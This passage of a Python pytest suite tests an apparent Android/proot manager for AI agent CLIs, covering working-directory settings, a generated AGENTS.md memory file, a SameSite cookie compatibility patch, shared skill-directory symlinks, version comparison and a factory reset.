        ok, _ = core.set_default_cwd("")
        assert ok
        assert core.get_default_cwd() == ""

    def test_settings_json_reports_the_effective_directory(self, tmp_path, monkeypatch, capsys):
        self._cfg(tmp_path, monkeypatch)
        core.settings_command(["--json"])
        payload = json.loads(capsys.readouterr().out)
        assert payload["effective_cwd"] == core.DEFAULT_CWD
        assert payload["default_cwd"] == ""
        assert payload["supported_keys"] == ["default_cwd", "lang", "proxy_mode", "proxy_url"]

    def test_proot_wrapper_uses_the_configured_directory(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        core.generate_proot_wrapper("mimo", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        assert ".ancli-config.json" in wrapper
        assert "default_cwd" in wrapper
        assert "configured default directory" in wrapper
        assert "ancli config --set default_cwd=" in wrapper   # discoverable hint


class TestAgentMemory:
    """The generated guest-global memory file is informative and non-destructive."""

    def _target(self, tmp_path, monkeypatch):
        target = tmp_path / "default-cwd"
        target.mkdir()
        memory = target / "AGENTS.md"
        monkeypatch.setattr(core, "_effective_default_cwd", lambda: str(target))
        monkeypatch.setattr(core, "_runtime_context_target",
                            lambda: (str(target), str(memory)))
        return target, memory

    def test_creates_rendered_memory_with_environment_and_guidance(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        monkeypatch.setattr(core, "load_installed", lambda: {
            "dsh": {"name": "DeepSeek Harness", "executable": "dsh",
                    "env": {"DEEPSEEK_API_KEY": "secret"}},
        })

        result = core.setup_runtime_context(verbose=False)

        assert result["status"] == "created"
        text = memory.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_MARKER in text
        assert str(core.VERSION) in text
        assert str(memory.parent) in text
        assert "DeepSeek Harness (`dsh`)" in text
        assert "DEEPSEEK_API_KEY" in text
        assert "secret" not in text
        assert "ancli status --json" in text
        assert "共享存储" in text
        assert "/data/local/tmp/build_cache" in text
        assert "faccessat2" in text
        assert "os.access(..., os.X_OK)" in text
        assert "dsh web --no-open" in text

    def test_keeps_existing_user_memory_by_default(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        memory.write_text("# User instructions\nkeep me\n", encoding="utf-8")

        result = core.setup_runtime_context(verbose=False)

        assert result["status"] == "kept"
        assert memory.read_text(encoding="utf-8") == "# User instructions\nkeep me\n"

    def test_refresh_only_replaces_ancli_generated_memory(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        memory.write_text(core.RUNTIME_CONTEXT_MARKER + "\nold\n", encoding="utf-8")

        result = core.setup_runtime_context(verbose=False, refresh=True)

        assert result["status"] == "refreshed"
        assert "old" not in memory.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_MARKER in memory.read_text(encoding="utf-8")

        memory.write_text("# User instructions\n", encoding="utf-8")
        result = core.setup_runtime_context(verbose=False, refresh=True)
        assert result["status"] == "kept"
        assert memory.read_text(encoding="utf-8") == "# User instructions\n"

    def test_changing_default_cwd_reports_memory_initialization(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "cfg.json"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        (tmp_path / "rootfs" / "srv" / "project").mkdir(parents=True)
        monkeypatch.setattr(core, "setup_runtime_context", lambda verbose=True: {
            "path": "/srv/project/AGENTS.md", "default_cwd": "/srv/project",
            "status": "created", "reason": None,
        })

        core.settings_command(["--set", "default_cwd=/srv/project", "--json"])

        payload = json.loads(capsys.readouterr().out)
        assert payload["effective_cwd"] == "/srv/project"
        assert payload["runtime_context"]["status"] == "created"


class TestDshCookiePatch:
    """Android hands the `dsh web` URL to Chrome through an Intent, which Chrome
    treats as cross-site, so a SameSite=Strict auth cookie is dropped on the token
    redirect and the UI answers "authentication required". Lax fixes that hop."""

    def _install_file(self, tmp_path, monkeypatch, body="SameSite=Strict"):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        directory = (tmp_path / "usr/local/lib/node_modules/@deepseek-ai/dsh/node_modules"
                                 "/@deepseek-ai/dsh-client-connection/lib")
        directory.mkdir(parents=True)
        target = directory / "index.js"
        target.write_text(f'const c = `a=b; Path=/; HttpOnly; {body}`\n', encoding="utf-8")
        return target

    def test_relaxes_strict_to_lax(self, tmp_path, monkeypatch):
        target = self._install_file(tmp_path, monkeypatch)

        patched = core.patch_dsh_web_cookie(verbose=False)

        assert [os.path.normpath(p) for p in patched] == [os.path.normpath(str(target))]
        assert "SameSite=Lax" in target.read_text(encoding="utf-8")
        assert "SameSite=Strict" not in target.read_text(encoding="utf-8")

    def test_is_idempotent(self, tmp_path, monkeypatch):
        target = self._install_file(tmp_path, monkeypatch)
        core.patch_dsh_web_cookie(verbose=False)

        assert core.patch_dsh_web_cookie(verbose=False) == []
        assert target.read_text(encoding="utf-8").count("SameSite=Lax") == 1

    def test_reports_nothing_when_dsh_is_absent(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        assert core.patch_dsh_web_cookie(verbose=False) == []


class TestSharedSkillDirs:
    """One global skills root, symlinked from every agent CLI that reads its own."""

    def _home(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SHARED_SKILL_DIR", str(tmp_path / ".agents" / "skills"))
        monkeypatch.setattr(core, "SKILL_LINK_DIRS", (
            str(tmp_path / ".claude" / "skills"),
            str(tmp_path / ".grok" / "skills"),
            str(tmp_path / ".config" / "opencode" / "skills"),
        ))
        return tmp_path

    def test_creates_shared_root_and_links_every_tool(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        result = core.setup_skill_dirs(verbose=False)

        assert (home / ".agents" / "skills").is_dir()
        for rel in (".claude/skills", ".grok/skills", ".config/opencode/skills"):
            link = home / rel
            assert link.is_symlink(), rel
            assert os.path.realpath(link) == os.path.realpath(home / ".agents" / "skills")

    def test_is_idempotent(self, tmp_path, monkeypatch):
        self._home(tmp_path, monkeypatch)
        core.setup_skill_dirs(verbose=False)
        result = core.setup_skill_dirs(verbose=False)
        assert result["created"] == []
        assert result["kept"] == []

    def test_never_touches_a_tool_dir_with_its_own_skills(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        own = home / ".grok" / "skills" / "private"
        own.mkdir(parents=True)
        (own / "SKILL.md").write_text("---\nname: private\ndescription: x\n---\n")

        result = core.setup_skill_dirs(verbose=False)

        assert not (home / ".grok" / "skills").is_symlink()
        assert (own / "SKILL.md").exists()          # user content untouched
        assert str(home / ".grok" / "skills") in result["kept"]

    def test_replaces_an_empty_placeholder_dir(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        (home / ".claude" / "skills").mkdir(parents=True)

        core.setup_skill_dirs(verbose=False)

        assert (home / ".claude" / "skills").is_symlink()

    def test_keeps_a_symlink_pointing_somewhere_else(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        other = home / "elsewhere"
        other.mkdir()
        (home / ".claude").mkdir()
        os.symlink(other, home / ".claude" / "skills")

        result = core.setup_skill_dirs(verbose=False)

        assert os.path.realpath(home / ".claude" / "skills") == os.path.realpath(other)
        assert str(home / ".claude" / "skills") in result["kept"]


class TestInstallSelfCheck:
    """A "successful" install that left no runnable binary must fail loudly."""

    def test_reports_failure_when_no_binary_and_no_version(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: None)
        monkeypatch.setattr(core, '_binary_exists', lambda exe: False)
        app = {"name": "Broken", "executable": "broken-tool", "version_cmd": "broken-tool --version"}

        assert core._install_proot_common("broken-tool", app) is False
        assert 'does not seem to be installed' in capsys.readouterr().out

    def test_reports_success_when_the_binary_is_there(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: None)
        monkeypatch.setattr(core, '_binary_exists', lambda exe: True)
        app = {"name": "Fine", "executable": "fine-tool", "version_cmd": "fine-tool --version"}

        assert core._install_proot_common("fine-tool", app) is True
        capsys.readouterr()


class TestReviewRegressions:
    def test_four_segment_versions_are_not_truncated(self):
        assert core._ver_key('1.0.0.1')[:4] == (1, 0, 0, 1)
        assert core._update_available('1.0.0', '1.0.0.1') is True

    def test_prerelease_versions_are_compared_not_truncated(self):
        """DeepSeek Harness publishes only prereleases: '0.1.7-rc.2' must not be
        flattened to '0.1.7', or the update badge freezes forever."""
        assert core._first_version('0.1.7-rc.2') == '0.1.7-rc.2'
        assert core._update_available('0.1.7-rc.2', '0.1.7-rc.3') is True
        assert core._update_available('0.1.7-rc.3', '0.1.7-rc.2') is False
        # a release outranks its own prereleases
        assert core._update_available('0.1.7-rc.2', '0.1.7') is True
        assert core._update_available('0.1.7', '0.1.7-rc.3') is False
        assert core._update_available('0.1.6', '0.1.7-rc.2') is True

    def test_scoped_npm_packages_use_one_path_segment(self, monkeypatch):
        urls = []

        def fake(url, timeout=15):
            urls.append(url)
            return {'version': '0.1.7-rc.2'}

        monkeypatch.setattr(core, '_http_json', fake)
        ver, src, err = core._latest_version(
            {'latest': {'source': 'npm', 'package': '@deepseek-ai/dsh'}}, {})
        assert (ver, src, err) == ('0.1.7-rc.2', 'npm:@deepseek-ai/dsh', None)
        assert urls == ['https://registry.npmjs.org/@deepseek-ai%2Fdsh/latest']

    def test_unknown_latest_source_is_reported_not_silently_static(self):
        ver, src, err = core._latest_version({'latest': {'source': 'gitlab'}, 'version': '1.0'}, {})
        assert ver is None and 'unknown latest.source' in err

    def test_static_without_declared_version_never_uses_the_framework_version(self):
        ver, src, err = core._latest_version({'latest': {'source': 'static'}}, {'version': '1.2.3'})
        assert ver is None and src == 'static'

    def test_text_channel_rejects_non_version_bodies(self, monkeypatch):
        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: '<html>oops</html>')
        ver, src, err = core._latest_version(
            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})
        assert ver is None and 'no version' in err

    def test_text_channel_accepts_a_bare_version(self, monkeypatch):
        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: 'v1.0.41\n')
        assert core._latest_version(
            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})[0] == '1.0.41'

    def test_registry_declared_value_is_not_labelled_as_a_live_check(self):
        app = {'name': 'X', 'executable': 'x', 'version_cmd': 'x --version', 'version': '1.0',
               'latest': {'source': 'static'}}
        info = {'installed_version': '0.9', 'version_verified': True}
        declared = core._app_record('x', app, True, info,
                                    {'version': '1.0', 'source': 'registry', 'error': None})
        assert declared['cloud_checked'] is False
        live = core._app_record('x', app, True, info,
                                {'version': '1.0', 'source': 'github:a/b', 'error': None})
        assert live['cloud_checked'] is True

    def test_bad_cache_types_do_not_crash(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "ancli", exist_ok=True)
        (tmp_path / "ancli" / ".update_cache.json").write_text('{"ts": 1, "latest": [1, 2]}')
        core.save_installed({"claude-code": {"executable": "claude", "installed_version": "1.0", "env": {}}})

        core.list_apps_json()          # must not raise on a hand-edited cache

        assert json.loads(capsys.readouterr().out)['apps'] == []
        assert core._load_update_cache()['latest'] == {}   # bad type normalised away

    def test_factory_reset_removes_user_state_and_restores_context(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        module_dir = tmp_path / "module"
        root_home = rootfs / "root"
        for path in [root_home, rootfs / "usr" / "bin", rootfs / "bin",
                     rootfs / "usr" / "local" / "bin", module_dir / "system" / "bin"]:
            path.mkdir(parents=True, exist_ok=True)
        (ancli_dir / "runtime-context").mkdir(parents=True)
        template = "<!-- ancli:runtime-context v1 -->\napps={{INSTALLED_APPS}}\n"
        (ancli_dir / "runtime-context" / "AGENTS.md").write_text(template, encoding="utf-8")
        (ancli_dir / "registry.json").write_text(
            json.dumps({"apps": {"fake": {"executable": "fake"}}}), encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(module_dir))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(ancli_dir / "secrets"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(ancli_dir / ".update_cache.json"))
        monkeypatch.setattr(core, "DNS_CACHE", str(ancli_dir / ".dns_cache"))
        monkeypatch.setattr(core, "SHARED_SKILL_DIR", str(root_home / ".agents" / "skills"))
        monkeypatch.setattr(core, "SKILL_LINK_DIRS", (str(root_home / ".claude" / "skills"),))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "_fix_config_permissions", lambda: None)

        (ancli_dir / "installed.json").write_text(
            json.dumps({"fake": {"name": "Fake", "executable": "fake"}}), encoding="utf-8")
        (ancli_dir / "secrets").mkdir()
        (ancli_dir / "secrets" / "fake.env").write_text("SECRET=x", encoding="utf-8")
        (ancli_dir / ".update_cache.json").write_text("{}", encoding="utf-8")
        (ancli_dir / ".webui_old.log").write_text("old", encoding="utf-8")
        current_log = ancli_dir / ".webui_current.log"
        current_log.write_text("reset output", encoding="utf-8")
        (root_home / ".agents").mkdir()
        (root_home / ".agents" / "AGENTS.md").write_text("old memory", encoding="utf-8")
        (root_home / "project.txt").write_text("delete me", encoding="utf-8")
        (rootfs / "usr" / "local" / "bin" / "fake").write_text("binary", encoding="utf-8")
        (rootfs / "usr" / "local" / "lib").mkdir(parents=True)
        (rootfs / "usr" / "local" / "lib" / "node_modules").mkdir()
        reinstalled = []
        monkeypatch.setattr(core, "load_registry", lambda: {"apps": {"fake": {"executable": "fake"}}})
        monkeypatch.setattr(core, "install_app", lambda app_id, registry: reinstalled.append(app_id) or True)

        result = core.reset_environment(keep_log=str(current_log), reinstall=True, verbose=False)

        assert result["status"] == "ok"
        assert reinstalled == ["fake"]
        assert result["reinstalled_apps"] == ["fake"]
        assert not (ancli_dir / "installed.json").exists()
        assert not (ancli_dir / "secrets" / "fake.env").exists()
        assert not (ancli_dir / ".webui_old.log").exists()
        assert current_log.exists()
        assert not (root_home / "project.txt").exists()
        assert not (rootfs / "usr" / "local" / "bin" / "fake").exists()
        context = root_home / ".agents" / "AGENTS.md"
        assert context.exists()
        assert "apps=无（尚未安装工具）" in context.read_text(encoding="utf-8")
        assert (rootfs / "usr" / "local" / "bin" / "xdg-open").exists()
